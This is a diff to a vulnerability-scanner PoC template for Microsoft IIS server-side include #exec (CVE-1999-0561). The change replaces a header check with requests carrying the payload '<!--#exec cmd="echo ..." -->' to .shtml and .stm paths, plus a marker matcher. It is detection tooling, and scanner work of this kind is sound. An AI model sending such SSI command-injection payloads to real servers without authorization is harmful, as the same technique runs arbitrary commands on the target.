@@ -1,14 +1,10 @@
 [info]
 author = "ave"
-description = "检测 Microsoft IIS 服务器端包含（SSI）#exec 远程代码执行漏洞。通过 HTTP 响应头识别 IIS 服务，判断目标是否可能受 SSI #exec 未授权命令执行缺陷影响。"
+description = "检测 Microsoft IIS 是否启用了服务器端包含（SSI）中的 #exec 指令。通过向目标提交包含 <!--#exec cmd=--> 的 .shtml 请求，若服务器解析并返回命令执行结果（如输出当前用户或目录），则表明 #exec 功能处于启用状态，存在被滥用于服务端命令执行的风险。该 PoC 仅做无损探测，不执行破坏性命令。"
 id = "POC-AVE-1999-0822"
-name = "CVE-1999-0561 PoC"
-severity = "critical"
-tags = [
-    "cve-1999-0561",
-    "iis",
-    "ssi",
-]
+name = "Microsoft IIS SSI #exec 启用检测 PoC"
+severity = "medium"
+tags = ["ave-1999-0822"]
 vuln_id = [
     "CVE-1999-0561",
     "AVE-1999-0822",
@@ -19,11 +15,36 @@ logic = "any"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/"
+path = "/{{BaseURL}}/ave_poc_test.shtml"
 protocol = "http"
+
+[poc.requests.body]
+content = '<!--#exec cmd="echo AVE_SSI_EXEC_ENABLED" -->'
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
-part = "header"
+part = "body"
 type = "word"
-words = ["Microsoft-IIS"]
+words = ["AVE_SSI_EXEC_ENABLED"]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/ave_poc_test.stm"
+protocol = "http"
+
+[poc.requests.body]
+content = '<!--#exec cmd="echo AVE_SSI_EXEC_ENABLED" -->'
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["AVE_SSI_EXEC_ENABLED"]
